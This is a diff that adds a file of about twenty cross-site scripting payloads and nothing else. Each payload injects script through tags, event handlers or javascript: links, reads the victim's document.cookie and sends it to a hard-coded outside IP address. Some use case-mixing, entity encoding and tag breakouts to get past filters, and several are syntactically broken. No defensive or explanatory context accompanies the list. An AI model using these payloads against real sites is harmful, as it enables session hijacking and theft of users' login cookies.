@@ -1,0 +1,20 @@
+<script>var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;</script>
+<img src=x onerror=this.src='http://18.204.4.74/?'+document.cookie;>
+<img src=x onerror="this.src='http://18.204.4.74/?'+document.cookie;this.BlockedAttribute('onerror');">
+<IFRAME onload="this.src='http://18.204.4.74/?'+document.cookie;"></IFRAME>
+<a onmouseover="var i=new Image;i.src='http://18.204.4.74/?'+document.cookie;">xxs link</a>
+“><ScRiPt>var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;</script>
+><<script>var i=new Image;i.src=http://18.204.4.74/?"+document.cookie;</script>
+foo<script>var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;</script>
+</script><script >var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;</script>
+>/XaDoS/><script>var i=new Image;i.src=http://18.204.4.74/?"+document.cookie;</script>
+>/test-vapt/><script>var i=new Image;i.src=http://18.204.4.74/?"+document.cookie;</script>
+<var onmouseover='var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;'>On Mouse Over</var>
+<a href="jAvAsCrIpT&colon;document.location='http://18.204.4.74/?'+document.cookie;">X</a>
+<? foo="><script>javascript:var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;</script>">
+<IFRAME width="420" height="315" frameborder="0" onload="this.src='http://18.204.4.74/?'+document.cookie;"></IFRAME>
+<input onfocus='javascript:var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;' autofocus>
+<iframe/src \/\/onload = document.location='http://18.204.4.74/?'+document.cookie;
+<IFRAME width="5000" height="1000000" frameborder="0" onload="this.src='http://18.204.4.74/?'+document.cookie;"></IFRAME>
+<a href="jAVaSCrIpT&colon;document.location='http://18.204.4.74/?'+document.cookie;">TESTINNGGG</a>
+<var onclick='var i=new Image;i.src="http://18.204.4.74/?"+document.cookie;'>OnClick</var>
